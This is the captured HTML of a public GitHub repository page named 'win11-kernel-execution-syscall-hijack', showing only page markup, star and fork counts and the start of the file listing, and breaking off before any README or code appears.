@@ -1,0 +1,1424 @@
+# https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack
+
+<!DOCTYPE html><html lang="en" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark" data-a11y-animated-images="system" data-a11y-link-underlines="true" data-turbo-loaded="">
+
+  <body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
+    <div data-turbo-body="" class="logged-out env-production page-responsive" style="word-wrap: break-word;">
+      <div id="__primerPortalRoot__" style="z-index: 1000; position: absolute; width: 100%;" data-turbo-permanent=""></div>
+      
+
+    <div class="position-relative header-wrapper js-header-wrapper ">
+      <a href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#start-of-content" data-skip-target-assigned="false" class="px-2 tmp-py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>
+
+      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
+    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
+</span>      
+      <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react-css.97f54ffef8be5c78.module.css">
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/keyboard-shortcuts-dialog.182bb7552d3acdf1.module.css">
+
+<react-partial partial-name="keyboard-shortcuts-dialog" data-ssr="false" data-attempted-ssr="false" data-react-profiling="false" data-catalyst="" class="loaded">
+  
+  
+  <div data-target="react-partial.reactRoot"><div class="d-none"></div></div>
+</react-partial>
+
+
+
+
+
+      
+
+          
+
+              
+
+
+
+
+
+
+
+
+      <div data-view-component="true" class="js-stale-session-flash stale-session-flash flash flash-warn flash-full">
+  
+        <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+        <span class="js-stale-session-flash-signed-in">You signed in with another tab or window. <a class="Link--inTextBlock" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack">Reload</a> to refresh your session.</span>
+        <span class="js-stale-session-flash-signed-out">You signed out in another tab or window. <a class="Link--inTextBlock" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack">Reload</a> to refresh your session.</span>
+        <span class="js-stale-session-flash-switched">You switched accounts on another tab or window. <a class="Link--inTextBlock" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack">Reload</a> to refresh your session.</span>
+
+    <button id="icon-button-6944a87e-32db-457f-bf83-9105996c6e63" aria-labelledby="tooltip-50c1a7d0-ffea-4153-a50f-4da3fe2b50fc" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium flash-close js-flash-close">  <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x Button-visual">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+</button><tool-tip id="tooltip-50c1a7d0-ffea-4153-a50f-4da3fe2b50fc" for="icon-button-6944a87e-32db-457f-bf83-9105996c6e63" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute" aria-hidden="true" role="tooltip"><slot></slot>Dismiss alert</tool-tip>
+
+
+  
+</div>
+    </div>
+
+  <div id="start-of-content" class="show-on-focus"></div>
+
+
+
+
+
+
+
+
+    <div id="js-flash-container" class="flash-container" data-turbo-replace="">
+
+
+
+
+  
+    
+<div class="flash flash-full   {{ className }}">
+  <div>
+    <button autofocus="" class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+    </button>
+    <div aria-atomic="true" role="alert" class="js-flash-alert">
+      
+      <div>{{ message }}</div>
+
+    </div>
+  </div>
+</div>
+  
+</div>
+
+
+    
+
+
+
+
+
+
+  <div class="application-main " data-commit-hovercards-enabled="" data-discussion-hovercards-enabled="" data-issue-and-pr-hovercards-enabled="" data-project-hovercards-enabled="">
+        <div itemscope="" itemtype="http://schema.org/SoftwareSourceCode" class="">
+    <main id="js-repo-pjax-container">
+      
+      
+
+
+
+
+
+
+
+  
+
+  <div id="repository-container-header" class="tmp-pt-3 hide-full-screen" style="background-color: var(--page-header-bgColor, var(--color-page-header-bg));" data-turbo-replace="">
+
+      <div class="d-flex flex-nowrap flex-justify-end tmp-mb-3  tmp-px-3 tmp-px-lg-5" style="gap: 1rem;">
+
+        <div class="flex-auto min-width-0 width-fit">
+            
+  <div class=" d-flex flex-wrap flex-items-center wb-break-word f3 text-normal">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo color-fg-muted mr-2 tmp-mr-2">
+    <path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path>
+</svg>
+    
+    <span class="author flex-self-stretch" itemprop="author">
+      <a class="url fn" rel="author" data-hovercard-type="user" data-hovercard-url="/users/V-i-x-x/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/V-i-x-x" aria-keyshortcuts="Alt+ArrowUp">
+        V-i-x-x
+</a>    </span>
+    <span class="mx-1 flex-self-stretch color-fg-muted">/</span>
+    <strong itemprop="name" class="mr-2 flex-self-stretch">
+      <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack">win11-kernel-execution-syscall-hijack</a>
+    </strong>
+
+    <span></span><span class="Label Label--secondary v-align-middle mr-1">Public</span>
+  </div>
+
+
+        </div>
+
+        <div id="repository-details-container" class="flex-shrink-0" data-turbo-replace="" style="max-width: 70%;">
+            <ul class="pagehead-actions flex-shrink-0 d-none d-md-inline" style="padding: 2px 0;">
+    
+      
+
+  <li>
+            <a href="https://github.com/login?return_to=%2FV-i-x-x%2Fwin11-kernel-execution-syscall-hijack" rel="nofollow" id="repository-details-watch-button" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;notification subscription menu watch&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="79ba521772e83e3c9829cbc050268ba2e160660278e0e3de9bdf08ea5d78f0a4" aria-label="You must be signed in to change notification settings" data-view-component="true" class="btn-sm btn" aria-describedby="tooltip-7bb5d296-e95b-4593-8fd8-c5073910c79d">    <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-bell mr-2 tmp-mr-2">
+    <path d="M8 16a2 2 0 0 0 1.985-1.75c.017-.137-.097-.25-.235-.25h-3.5c-.138 0-.252.113-.235.25A2 2 0 0 0 8 16ZM3 5a5 5 0 0 1 10 0v2.947c0 .05.015.098.042.139l1.703 2.555A1.519 1.519 0 0 1 13.482 13H2.518a1.516 1.516 0 0 1-1.263-2.36l1.703-2.554A.255.255 0 0 0 3 7.947Zm5-3.5A3.5 3.5 0 0 0 4.5 5v2.947c0 .346-.102.683-.294.97l-1.703 2.556a.017.017 0 0 0-.003.01l.001.006c0 .002.002.004.004.006l.006.004.007.001h10.964l.007-.001.006-.004.004-.006.001-.007a.017.017 0 0 0-.003-.01l-1.703-2.554a1.745 1.745 0 0 1-.294-.97V5A3.5 3.5 0 0 0 8 1.5Z"></path>
+</svg>Notifications
+</a>    <tool-tip id="tooltip-7bb5d296-e95b-4593-8fd8-c5073910c79d" for="repository-details-watch-button" popover="manual" data-direction="s" data-type="description" data-view-component="true" class="sr-only position-absolute" role="tooltip"><slot></slot>You must be signed in to change notification settings</tool-tip>
+
+  </li>
+
+  <li>
+          <a icon="repo-forked" id="fork-button" href="https://github.com/login?return_to=%2FV-i-x-x%2Fwin11-kernel-execution-syscall-hijack" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;repo details fork button&quot;,&quot;repository_id&quot;:997855435,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="342cf194c62141cfcfc6f0b6f797693856d30e9c309b0dff3c307be28f53bb83" data-view-component="true" class="btn-sm btn">    <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked mr-2 tmp-mr-2">
+    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
+</svg>Fork
+    <span id="repo-network-counter" data-pjax-replace="true" data-turbo-replace="true" title="11" data-view-component="true" class="Counter">11</span>
+</a>
+  </li>
+
+  <li>
+        <div data-view-component="true" class="BtnGroup d-flex">
+        <a href="https://github.com/login?return_to=%2FV-i-x-x%2Fwin11-kernel-execution-syscall-hijack" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;star button&quot;,&quot;repository_id&quot;:997855435,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="eec849d0cdd357c354ceb9c6a135c96666e84394d1d0ccec26df92516035a53d" aria-label="You must be signed in to star a repository" data-view-component="true" class="tooltipped tooltipped-sw btn-sm btn">    <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star v-align-text-bottom d-inline-block mr-2 tmp-mr-2">
+    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
+</svg><span data-view-component="true" class="d-inline">
+          Star
+</span>          <span id="repo-stars-counter-star" aria-label="80 users starred this repository" data-singular-suffix="user starred this repository" data-plural-suffix="users starred this repository" data-turbo-replace="true" title="80" data-view-component="true" class="Counter js-social-count">80</span>
+</a></div>
+  </li>
+
+</ul>
+
+        </div>
+      </div>
+
+        <div id="responsive-meta-container" data-turbo-replace="">
+</div>
+
+
+          
+
+  </div>
+  
+
+
+
+<turbo-frame id="repo-content-turbo-frame" target="_top" data-turbo-action="advance" class="">
+    <div id="repo-content-pjax-container" class="repository-content ">
+    
+
+
+
+    
+      
+    
+
+
+
+
+
+
+
+
+<react-app app-name="code-view" initial-path="/V-i-x-x/win11-kernel-execution-syscall-hijack" style="display: block; min-height: calc(100vh - 64px);" data-attempted-ssr="true" data-ssr="true" data-lazy="false" data-alternate="false" data-data-router-enabled="true" data-react-profiling="false" data-catalyst="" class="loaded">
+  
+  
+  <div data-target="react-app.reactRoot"> <!-- --> <a id="code-view-repo-link" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack" data-discover="true"></a> <div class="d-none"></div><div><div style="--spacing:var(--spacing-none)" class="prc-PageLayout-PageLayoutRoot--KH-d" data-component="PageLayout"><div class="prc-PageLayout-PageLayoutWrapper-2BhU2" data-width="full"><div class="prc-PageLayout-PageLayoutContent-BneH9"><div data-component="PageLayout.Content" class="prc-PageLayout-ContentWrapper-gR9eG" data-is-hidden-narrow="false"><div class="prc-PageLayout-Content-xWL-A" data-width="full" style="--spacing:var(--spacing-none)"><div class="SharedPageLayout-module__content__IwGAp" data-selector="repos-split-pane-content" tabindex="0"><div style="--spacing:var(--spacing-none)" class="prc-PageLayout-PageLayoutRoot--KH-d container-xl" data-component="PageLayout"><div class="prc-PageLayout-PageLayoutWrapper-2BhU2" data-width="full"><div class="prc-PageLayout-PageLayoutContent-BneH9"><div data-component="PageLayout.Content" class="prc-PageLayout-ContentWrapper-gR9eG" data-is-hidden="false"><div class="prc-PageLayout-Content-xWL-A" data-width="large" style="--spacing:var(--spacing-condensed)"><div class="OverviewContent-module__Box__PF75K tmp-pl-lg-3 mt-0"><div class="OverviewHeader-module__Box__cC1RH"></div><div class="OverviewContent-module__Box_1__MPS0U"><div class="OverviewContent-module__Box_2__Di8Pb"><div class="OverviewContent-module__Box_3__wzlJx"><button data-component="Button" type="button" aria-haspopup="true" aria-expanded="false" tabindex="0" style="min-width:0" aria-label="main branch" data-testid="anchor-button" data-icv-name="Switch branches/tags" class="prc-Button-ButtonBase-9n-Xk overview-ref-selector width-full RefSelectorAnchoredOverlay-module__RefSelectorOverlayBtn__a3WK3" data-loading="false" data-size="medium" data-variant="default" id="ref-picker-repos-header-ref-selector"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="text" class="prc-Button-Label-FWkx3"><div class="RefSelectorAnchoredOverlay-module__RefSelectorOverlayContainer__yaf4p"><div class="RefSelectorAnchoredOverlay-module__RefSelectorOverlayHeader__XtXRG"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-git-branch" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path></svg></div><div class="ref-selector-button-text-container RefSelectorAnchoredOverlay-module__RefSelectorBtnTextContainer__Di3rk"><span class="RefSelectorAnchoredOverlay-module__RefSelectorText__w_fmP">&nbsp;<!-- -->main</span></div></div></span><span data-component="trailingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-triangle-down" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path></svg></span></span></button><div class="d-none"></div></div><div class="OverviewContent-module__Box_4__qf73o"><a data-component="Button" type="button" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/branches" class="prc-Button-ButtonBase-9n-Xk OverviewContent-module__Button___Uotu" data-loading="false" data-size="medium" data-variant="invisible"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-git-branch" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path></svg></span><span data-component="text" class="prc-Button-Label-FWkx3"><span><strong class="color-fg-default">1 </strong>Branch</span></span></span></a><a data-component="Button" type="button" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/tags" class="prc-Button-ButtonBase-9n-Xk OverviewContent-module__Button___Uotu" data-loading="false" data-size="medium" data-variant="invisible"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1 7.775V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 0 1 0 2.474l-5.026 5.026a1.75 1.75 0 0 1-2.474 0l-6.25-6.25A1.752 1.752 0 0 1 1 7.775Zm1.5 0c0 .066.026.13.073.177l6.25 6.25a.25.25 0 0 0 .354 0l5.025-5.025a.25.25 0 0 0 0-.354l-6.25-6.25a.25.25 0 0 0-.177-.073H2.75a.25.25 0 0 0-.25.25ZM6 5a1 1 0 1 1 0 2 1 1 0 0 1 0-2Z"></path></svg></span><span data-component="text" class="prc-Button-Label-FWkx3"><span><strong class="color-fg-default">0 </strong>Tags</span></span></span></a></div><div class="OverviewContent-module__Box_5__Zc3i7"><a data-component="Button" type="button" aria-label="Go to Branches page" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/branches" class="prc-Button-ButtonBase-9n-Xk OverviewContent-module__Button_1__vmS6D" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="invisible"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-git-branch" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path></svg></a><a data-component="Button" type="button" aria-label="Go to Tags page" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/tags" class="prc-Button-ButtonBase-9n-Xk OverviewContent-module__Button_1__vmS6D" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="invisible"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1 7.775V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 0 1 0 2.474l-5.026 5.026a1.75 1.75 0 0 1-2.474 0l-6.25-6.25A1.752 1.752 0 0 1 1 7.775Zm1.5 0c0 .066.026.13.073.177l6.25 6.25a.25.25 0 0 0 .354 0l5.025-5.025a.25.25 0 0 0 0-.354l-6.25-6.25a.25.25 0 0 0-.177-.073H2.75a.25.25 0 0 0-.25.25ZM6 5a1 1 0 1 1 0 2 1 1 0 0 1 0-2Z"></path></svg></a></div></div><div class="OverviewContent-module__Box_6__Y_Yb_"><div class="OverviewContent-module__Box_7__JuRXo"><div class="d-none"></div><div class="OverviewContent-module__Box_8__UZCZh"><div class="OverviewContent-module__FileResultsList__EjrTH"><span class="d-flex FileResultsList-module__FilesSearchBox__ivVkc TextInput-wrapper prc-components-TextInputWrapper-Hpdqi prc-components-TextInputBaseWrapper-wY-n0" data-no-trailing-action="true" data-component="TextInput" data-leading-visual="true" data-trailing-visual="true" aria-busy="false"><span class="TextInput-icon" id="_r_0_" aria-hidden="true" data-component="TextInput.LeadingVisual"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-search" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path></svg></span><input aria-label="Go to file" role="combobox" aria-controls="file-results-list" aria-expanded="false" aria-haspopup="dialog" autocorrect="off" spellcheck="false" placeholder="Go to file" aria-describedby="_r_0_ _r_1_" data-component="input" class="prc-components-Input-IwWrt" type="text" value=""><span class="TextInput-icon" id="_r_1_" aria-hidden="true" data-component="TextInput.TrailingVisual"></span></span></div></div><div class="OverviewContent-module__Box_9__bqMPw"><button data-component="Button" type="button" class="prc-Button-ButtonBase-9n-Xk" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="default"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="text" class="prc-Button-Label-FWkx3">Go to file</span></span></button></div></div><button data-component="Button" type="button" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-9n-Xk" data-loading="false" data-size="medium" data-variant="primary" id="_R_94ql3al1d_"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-code hide-sm" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path></svg></span><span data-component="text" class="prc-Button-Label-FWkx3">Code</span><span data-component="trailingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-triangle-down" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path></svg></span></span></button><div class="OverviewContent-module__Box_10__mGSb4"><button data-component="IconButton" type="button" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-9n-Xk prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="default" aria-labelledby="_R_7r4ql3al1d_" id="_R_b4ql3al1d_"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-kebab-horizontal" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="n" data-component="Tooltip" aria-hidden="true" id="_R_7r4ql3al1d_" popover="auto">Open more actions menu</span></div></div></div><div class="OverviewContent-module__Box_11__F19kY"><div data-hpc="true" containertiming="hpc"><div class="d-none"></div><h2 class="sr-only ScreenReaderHeading-module__userSelectNone__rwWIk prc-Heading-Heading-MtWFE" data-component="Heading" data-testid="screen-reader-heading" id="folders-and-files">Folders and files</h2><table class="Table-module__Box__HZKiQ" aria-labelledby="folders-and-files"><thead class="DirectoryContent-module__OverviewHeaderRow__hOrKy Table-module__Box_1__VacXC"><tr class="Table-module__Box_2__PBp9s"><th colspan="2" class="DirectoryContent-module__Box__iC_5e"><span class="text-bold">Name</span></th><th colspan="1" class="DirectoryContent-module__Box_1__fuSBO"><span class="text-bold">Name</span></th><th class="hide-sm"><div class="width-fit prc-Truncate-Truncate-2G1eo" data-inline="true" title="Last commit message" style="--truncate-max-width:125px"><span class="text-bold">Last commit message</span></div></th><th colspan="1" class="DirectoryContent-module__Box_2__Ccrx7"><div class="width-fit prc-Truncate-Truncate-2G1eo" data-inline="true" title="Last commit date" style="--truncate-max-width:125px"><span class="text-bold">Last commit date</span></div></th></tr></thead><tbody><tr class="DirectoryContent-module__Box_3__gl6dE"><td colspan="3" class="bgColor-muted p-1 rounded-top-2"><div class="LatestCommit-module__Box__B25ZT"><h2 class="sr-only ScreenReaderHeading-module__userSelectNone__rwWIk prc-Heading-Heading-MtWFE" data-component="Heading" data-testid="screen-reader-heading">Latest commit</h2><div data-testid="latest-commit" class="LatestCommit-module__Box_1__YkEgg"><div class="CommitAttribution-module__CommitAttributionContainer__I_rfs"><div data-testid="author-avatar" class="AuthorAvatar-module__AuthorAvatarContainer__n0MVc"><a class="prc-Link-Link-9ZwDx" data-component="Link" href="https://github.com/V-i-x-x" data-testid="avatar-icon-link" data-hovercard-url="/users/V-i-x-x/hovercard" data-hovercard-type="user" octo-click="hovercard-link-click" octo-dimensions="link_type:self" aria-keyshortcuts="Alt+ArrowUp"><img data-component="Avatar" class="AuthorAvatar-module__authorAvatarImage__a3R8x prc-Avatar-Avatar-0xaUi" alt="V-i-x-x" width="20" height="20" data-testid="github-avatar" aria-label="V-i-x-x" src="https://avatars.githubusercontent.com/u/21037679?v=4&amp;size=40" style="--avatarSize-regular: 20px;"></a><a class="AuthorAvatar-module__authorHoverableLink__MHTT8 prc-Link-Link-9ZwDx" data-component="Link" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/commits?author=V-i-x-x" aria-label="commits by V-i-x-x" data-hovercard-url="/users/V-i-x-x/hovercard" data-hovercard-type="user" octo-click="hovercard-link-click" octo-dimensions="link_type:self" aria-keyshortcuts="Alt+ArrowUp" style="--author-font-weight: var(--base-text-weight-semibold); --author-font-color: var(--fgColor-default);">V-i-x-x</a></div><span class=""></span></div><div class="d-none d-sm-flex LatestCommit-module__Box_2__pSPKJ"><div class="Truncate flex-items-center f5"><span class="Truncate-text prc-Text-Text-9mHv3" 